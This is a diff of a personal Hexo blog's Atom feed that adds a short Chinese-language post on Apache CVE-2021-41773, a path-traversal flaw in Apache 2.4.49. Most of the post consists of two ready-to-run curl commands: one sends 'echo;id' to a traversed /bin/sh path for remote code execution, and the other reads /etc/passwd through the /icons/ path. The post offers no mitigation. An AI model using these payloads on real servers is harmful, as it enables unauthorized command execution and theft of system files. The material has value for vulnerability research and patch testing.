@@ -6,7 +6,7 @@
   <link href="https://github.com/chenchanghui/chenchanghui.github.io/atom.xml" rel="self"/>
   
   <link href="https://github.com/chenchanghui/chenchanghui.github.io/"/>
-  <updated>2021-10-08T12:37:11.920Z</updated>
+  <updated>2021-10-09T02:44:42.094Z</updated>
   <id>https://github.com/chenchanghui/chenchanghui.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache CVE-2021-41773</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/59b5dccf.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/59b5dccf.html</id>
+    <published>2021-10-09T02:43:17.000Z</published>
+    <updated>2021-10-09T02:44:42.094Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>漏洞原因：</p><p>此漏洞由不安全的配置触发</p><p>如果网站配置中，将 根目录 / 配置为</p><pre class="line-numbers language-none"><code class="language-none">Require all granted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则可以通过cgi-bin/目录，配合 ../</p><p>只存在于apache2.4.49，在其他版本不存在</p><p>RCE</p><pre class="line-numbers language-none"><code class="language-none">curl --data "echo;id" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取</p><pre class="line-numbers language-none"><code class="language-none">curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/09/5iU6ud.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>linux命令</title>
